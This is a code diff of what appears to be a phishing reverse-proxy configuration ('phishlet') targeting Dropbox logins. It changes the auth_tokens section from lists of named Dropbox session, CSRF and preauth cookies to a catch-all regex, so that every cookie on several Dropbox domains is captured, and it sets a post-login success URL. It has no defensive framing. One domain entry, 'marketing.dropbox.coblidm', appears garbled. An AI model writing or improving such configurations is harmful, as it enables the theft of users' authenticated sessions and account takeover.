@@ -49,17 +49,15 @@ sub_filters:
 
 auth_tokens:
   - domain: '.dropbox.com'
-    keys: ['t', 'blid', 'db-help-center-uid', '_iidt', 'bjar', 'last_active_role', 'baklawa', 'malabi', '__Secure-reseller_session', 'sm_auth', 'rl_auth', '__Secure-dbx_consent', '_evidon_consent_cookie', '_evidon_suppress_notification_cookie', '__Secure-dbx_do_not_sell', '__Secure-dbx_ccpa_token', '__Secure-untrusted_session']
-  - domain: 'www.dropbox.com'
-    keys: ['seen-sl-signup-modal', 'Host-js_csrf', 'gvc', 'Host-logged-out-session', 'Host-ss', '__Host-ss', '__Host-js_csrf', 'consent-shown', 'seen-sl-download-modal']
+    keys: ['.*,regexp']
   - domain: '.www.dropbox.com'
-    keys: ['lid', 'jar', 'toaster', 'giraffe', 'preauth']
+    keys: ['.*,regexp']
   - domain: 'marketing.dropbox.coblidm'
-    keys: ['sa-user-id']
+    keys: ['.*,regexp']
   - domain: 'marketing.dropbox.com'
-    keys: ['sa-user-id-v2']
+    keys: ['.*,regexp']
   - domain: 'aem.dropbox.com'
-    keys: ['AWSELB', 'AWSELBCORS']
+    keys: ['.*,regexp']
 
 auth_urls:
   - '/page_success/end'
